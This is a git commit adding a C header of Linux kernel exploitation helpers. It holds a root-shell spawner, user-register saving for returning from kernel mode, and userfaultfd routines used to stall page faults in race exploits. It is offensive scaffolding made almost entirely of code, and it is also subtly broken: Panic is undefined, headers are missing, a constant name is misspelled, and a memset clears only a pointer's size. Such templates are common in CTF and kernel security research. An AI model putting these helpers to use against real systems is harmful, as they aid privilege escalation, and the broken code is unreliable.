59ecb84444162f3b5b06732f56fdca00c001d25d
Alex Schmith <alexanderschmith@protonmail.com>
2023-08-01 11:00:45 -0400

    Create kernel.h
    Kernel exploitation headers

---
+++ templates/kernel.h
@@ -0,0 +1,106 @@
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <stropts.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <stdint.h>
+
+#define PAGE_SIZE 0x1000
+#define TTY_STRUCT_SZIE 0x2E0
+
+void shell(){
+    if(!getuid()){
+        system("/bin/sh");
+    }
+    else{
+        puts("[!] Failed to Escape");
+    }
+}
+
+uint64_t u64(uint8_t *buf)
+{
+    uint64_t res = 0;
+    for(int i =0 ; i < 8;i++)
+    {
+        res = res<<8;
+        res+=(uint)buf[7-i];
+    }
+    return res;
+}
+
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    __asm__("mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            );
+    puts("[*]status has been saved.");
+}
+
+void RegisterUserfault(void *fault_page,void *handler){
+    pthread_t thr;
+    struct uffdio_api ua;
+    struct uffdio_register ur;
+    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    ua.api = UFFD_API;
+    ua.features = 0;
+    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
+        Panic("ioctl-UFFDIO_API");
+
+    ur.range.start = (unsigned long)fault_page; 
+    ur.range.len   = PAGE_SIZE;
+    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
+    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
+        Panic("ioctl-UFFDIO_REGISTER");
+
+    int s = pthread_create(&thr, NULL,handler, (void*)uffd);
+
+    if (s!=0)
+        Panic("pthread_create");
+}
+
+void* userfaultfd_leak_handler(void* arg){
+    struct uffd_msg msg;
+    unsigned long uffd = (unsigned long) arg;
+    struct pollfd pollfd;
+    int nready;
+    pollfd.fd = uffd;
+    pollfd.events = POLLIN;
+    
+    nready = poll(&pollfd, 1, -1);
+    sleep(3);
+    if (nready != 1)
+    {
+        Panic("Wrong poll return val");
+    }
+    nready = read(uffd, &msg, sizeof(msg));
+    if (nready <= 0)
+    {
+        Panic("msg err");
+    }
+
+    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED)
+    {
+        Panic("[-] mmap err");
+    }
+    struct uffdio_copy uc;
+    // init page
+    memset(page, 0, sizeof(page));
+    uc.src = (unsigned long) page;
+    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
+    uc.len = PAGE_SIZE;
+    uc.mode = 0;
+    uc.copy = 0;
+    ioctl(uffd, UFFDIO_COPY, &uc);
+    return NULL;
+}
